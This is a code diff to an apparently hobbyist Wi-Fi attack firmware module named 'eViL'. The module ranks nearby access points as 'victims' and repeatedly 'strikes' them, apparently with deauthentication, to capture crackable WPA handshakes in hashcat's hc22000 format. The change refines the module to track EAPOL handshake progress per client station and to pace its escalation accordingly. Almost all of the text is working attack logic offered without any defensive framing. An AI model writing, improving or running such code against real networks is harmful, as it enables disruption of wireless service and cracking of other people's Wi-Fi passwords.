@@ -45,8 +45,9 @@ struct EvilEntry {
     uint32_t lastKickMs;   // millis() of last strike at this AP
     uint32_t lastSeenMs;   // millis() of last time it was visible on our channel
     uint8_t  attempts;     // strikes sent at this AP (drives escalation)
-    uint8_t  misses;       // consecutive strikes with no EAPOL-mask progress
-    uint8_t  lastMask;     // handshake mask captured at the previous strike
+    uint8_t  misses;       // consecutive strikes with no same-station progress
+    uint8_t  lastMask;     // one-station progress captured at the previous strike
+    uint8_t  lastStation[6];
     bool     used;
 };
 static EvilEntry s_log[EVIL_SLOTS];
@@ -147,8 +148,7 @@ static uint8_t maskBits(uint8_t m) {
 // ----- the hunger score ---------------------------------------------------
 // eViL ranks victims by "how close am I to a crackable handshake, and how
 // likely is a strike to land". Proximity + clients + activity get it started;
-// the EAPOL-mask terms are what make it smart - a target that already gave us
-// half the four-way is worth far more than a silent stranger.
+// validated progress from one station further prioritizes a viable exchange.
 static int32_t computeEvilScore(const BeaconView& b, uint8_t hsDepth, bool dataAct) {
     int32_t s = 0;
 
@@ -175,10 +175,11 @@ static int32_t computeEvilScore(const BeaconView& b, uint8_t hsDepth, bool dataA
         }
     }
 
-    // Handshake progress - the heart of eViL. Every captured EAPOL bit is a
-    // step closer; having exactly one leg of the M1/M2 pair already landed
-    // means a single client reply completes a crackable capture.
-    uint8_t mask = Hc22000::handshakeMask(b.bssid);
+    // Handshake progress - score only the best validated sequence from one
+    // station, never an OR of EAPOL messages across different clients.
+    const Hc22000::HandshakeProgress progress =
+        Hc22000::handshakeProgress(b.bssid, 2);
+    uint8_t mask = progress.messages;
     s += (int32_t)maskBits(mask) * 12;
     bool m1 = (mask & 0x01) != 0, m2 = (mask & 0x02) != 0;
     if ((m1 && !m2) || (!m1 && m2)) s += 25;
@@ -215,14 +216,20 @@ static uint8_t roundsFor(const Ctx& ctx, const EvilEntry* e) {
 // ----- strike / attract ---------------------------------------------------
 static void strike(const Ctx& ctx, BeaconView& b, uint32_t now) {
     EvilEntry* e = entryFor(b.bssid);
-    uint8_t maskBefore = Hc22000::handshakeMask(b.bssid);
+    const Hc22000::HandshakeProgress progress =
+        Hc22000::handshakeProgress(b.bssid, 2);
+    uint8_t maskBefore = progress.messages;
+    static const uint8_t noStation[6] = {};
+    const bool sameStation = progress.hasStation
+        ? memcmp(progress.station, e->lastStation, 6) == 0
+        : memcmp(e->lastStation, noStation, sizeof(noStation)) == 0;
 
-    // Did the EAPOL mask move since our last strike? If so, this victim is
-    // "breathing" (clients re-associate) - reset the miss counter and keep
-    // pressing. If it stayed frozen, log a miss so the pacing escalates.
+    // Did one station's validated EAPOL progress move since our last strike?
+    // A different station starts a new baseline rather than counting as progress.
     if (e->attempts > 0) {
-        if (maskBefore != e->lastMask)  e->misses = 0;
-        else if (e->misses < 255)       e->misses++;
+        if (!sameStation) e->misses = 0;
+        else if (maskBefore != e->lastMask) e->misses = 0;
+        else if (e->misses < 255) e->misses++;
     }
     uint8_t rounds = roundsFor(ctx, e);
 
@@ -254,6 +261,8 @@ static void strike(const Ctx& ctx, BeaconView& b, uint32_t now) {
 
     if (e->attempts < 255) e->attempts++;
     e->lastMask   = maskBefore;
+    if (progress.hasStation) memcpy(e->lastStation, progress.station, 6);
+    else memset(e->lastStation, 0, sizeof(e->lastStation));
     e->lastKickMs = now;
     e->lastSeenMs = now;
 }
